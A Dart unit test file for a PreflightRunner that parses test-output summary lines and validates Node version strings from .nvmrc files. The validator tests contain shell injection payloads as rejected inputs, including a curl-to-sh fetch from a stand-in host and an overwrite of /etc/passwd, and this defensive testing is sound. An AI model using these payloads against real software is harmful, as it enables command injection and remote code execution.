import 'package:mason_logger/mason_logger.dart';
import 'package:somnio/src/runner/preflight.dart';
import 'package:test/test.dart';

void main() {
  group('PreflightRunner.parseCompactTestOutput', () {
    late PreflightRunner runner;

    setUp(() {
      runner = PreflightRunner(logger: Logger(level: Level.quiet));
    });

    test('counts +N as passed and adds failures to the total', () {
      final counts = runner.parseCompactTestOutput(
        '+10 -2: Some tests failed.',
        '',
      );

      expect(counts.passed, 10);
      expect(counts.failed, 2);
      expect(counts.skipped, 0);
      expect(counts.total, 12);
    });

    test('includes skipped tests in the total', () {
      final counts = runner.parseCompactTestOutput(
        '+10 ~3: Some tests skipped.',
        '',
      );

      expect(counts.passed, 10);
      expect(counts.failed, 0);
      expect(counts.skipped, 3);
      expect(counts.total, 13);
    });

    test('counts passed, skipped and failed together', () {
      final counts = runner.parseCompactTestOutput(
        '+10 ~3 -2: Some tests failed.',
        '',
      );

      expect(counts.passed, 10);
      expect(counts.failed, 2);
      expect(counts.skipped, 3);
      expect(counts.total, 15);
    });

    test('reports an all-pass run', () {
      final counts = runner.parseCompactTestOutput('+42: All tests passed!', '');

      expect(counts.passed, 42);
      expect(counts.failed, 0);
      expect(counts.skipped, 0);
      expect(counts.total, 42);
    });

    test('reads the final summary line, not an earlier progress line', () {
      final counts = runner.parseCompactTestOutput(
        '+1: loads config\n'
        '+2: parses steps\n'
        '+2 -1: Some tests failed.',
        '',
      );

      expect(counts.passed, 2);
      expect(counts.failed, 1);
      expect(counts.total, 3);
    });

    test('returns zeroes when there is no summary line', () {
      final counts = runner.parseCompactTestOutput('No tests ran.', '');

      expect(counts.passed, 0);
      expect(counts.failed, 0);
      expect(counts.skipped, 0);
      expect(counts.total, 0);
    });
  });

  group('PreflightRunner.isValidNodeVersion', () {
    late PreflightRunner runner;

    setUp(() {
      runner = PreflightRunner(logger: Logger(level: Level.quiet));
    });

    test('accepts legitimate .nvmrc / .node-version specifiers', () {
      for (final version in [
        '18',
        'v18.17.0',
        '20.11',
        '16.20.2',
        'lts/*',
        'lts/iron',
        'node',
        'stable',
        'unstable',
      ]) {
        expect(
          runner.isValidNodeVersion(version),
          isTrue,
          reason: '$version should be accepted',
        );
      }
    });

    test(
      'rejects a .nvmrc shell injection payload (the reported exploit)',
      () {
        expect(runner.isValidNodeVersion('18; touch /tmp/pwned'), isFalse);
      },
    );

    test('rejects other shell metacharacter payloads', () {
      for (final payload in [
        '18 && curl -s https://evil.sh | sh',
        '18\ntouch /tmp/x',
        '18 `id`',
        '18\$(id)',
        '\$(id)',
        '18|sh',
        '18 > /etc/passwd',
        "18'; id; '",
      ]) {
        expect(
          runner.isValidNodeVersion(payload),
          isFalse,
          reason: '$payload should be rejected',
        );
      }
    });

    test(
      'rejects a trailing newline (non-multiLine \$ anchors to the true '
      'end of string, not before a trailing newline)',
      () {
        expect(runner.isValidNodeVersion('18\n'), isFalse);
      },
    );
  });
}
